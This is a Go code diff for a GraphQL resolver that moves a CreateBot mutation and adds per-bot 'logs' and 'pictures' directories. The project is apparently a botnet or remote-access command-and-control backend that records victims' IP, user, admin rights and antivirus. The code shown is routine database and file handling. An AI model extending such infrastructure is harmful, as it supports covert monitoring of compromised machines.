@@ -3,18 +3,18 @@ package api
 import (
 	"context"
 	"fmt"
+	"log"
+	"os"
+	"path"
 	"time"
-
-	"github.com/jinzhu/gorm"
-
-	"github.com/dgrijalva/jwt-go"
-
-	"golang.org/x/crypto/bcrypt"
-
-	"github.com/gofrs/uuid"
 
 	"github.com/MShoaei/eagle/middlewares"
 	"github.com/MShoaei/eagle/models"
+	"github.com/MShoaei/eagle/utils"
+	"github.com/dgrijalva/jwt-go"
+	"github.com/gofrs/uuid"
+	"github.com/jinzhu/gorm"
+	"golang.org/x/crypto/bcrypt"
 )
 
 type Resolver struct {
@@ -30,30 +30,6 @@ func (r *Resolver) Query() QueryResolver {
 }
 
 type mutationResolver struct{ *Resolver }
-
-func (r *mutationResolver) CreateBot(ctx context.Context, input models.NewBot) (*models.Bot, error) {
-	newID, _ := uuid.NewV4()
-	// r.db = models.DB
-	// if err := r.DB.Open(); err != nil {
-	// 	return models.Bot{}, err
-	// }
-	bot := models.Bot{
-		ID:          newID.String(),
-		IP:          input.IP,
-		WhoAmI:      input.WhoAmI,
-		Os:          input.Os,
-		InstallDate: input.InstallDate,
-		Admin:       input.Admin,
-		Av:          input.Av,
-		CPU:         input.CPU,
-		Gpu:         input.Gpu,
-		Version:     input.Version,
-	}
-	if err := r.DB.Create(&bot).Error; err != nil {
-		return &models.Bot{}, err
-	}
-	return &bot, nil
-}
 
 func (r *mutationResolver) CreateAdmin(ctx context.Context, username string, password string, passwordConfirm string) (*models.Admin, error) {
 	if len(password) < 8 || password != passwordConfirm {
@@ -77,6 +53,33 @@ func (r *mutationResolver) CreateAdmin(ctx context.Context, username string, pas
 	}
 
 	return &admin, nil
+}
+
+func (r *mutationResolver) CreateBot(ctx context.Context, input models.NewBot) (*models.Bot, error) {
+	newID, _ := uuid.NewV4()
+	bot := models.Bot{
+		ID:          newID.String(),
+		IP:          input.IP,
+		WhoAmI:      input.WhoAmI,
+		Os:          input.Os,
+		InstallDate: input.InstallDate,
+		Admin:       input.Admin,
+		Av:          input.Av,
+		CPU:         input.CPU,
+		Gpu:         input.Gpu,
+		Version:     input.Version,
+	}
+	if err := r.DB.Create(&bot).Error; err != nil {
+		return &models.Bot{}, err
+	}
+	profile := path.Join(utils.ProfilesDir, bot.ID)
+	if err := utils.Fs.Mkdir(profile, os.ModeDir|os.ModePerm); err != nil {
+		log.Fatal(err)
+		return &bot, err
+	}
+	utils.Fs.Mkdir(path.Join(profile, "logs"), os.ModeDir|os.ModePerm)
+	utils.Fs.Mkdir(path.Join(profile, "pictures"), os.ModeDir|os.ModePerm)
+	return &bot, nil
 }
 
 func (r *mutationResolver) DeleteBot(ctx context.Context, id string) (bool, error) {
@@ -110,6 +113,7 @@ func (r *queryResolver) Bots(ctx context.Context) ([]models.Bot, error) {
 	}
 	return bots, nil
 }
+
 func (r *queryResolver) Bot(ctx context.Context, id string) (*models.Bot, error) {
 	bot := models.Bot{}
 
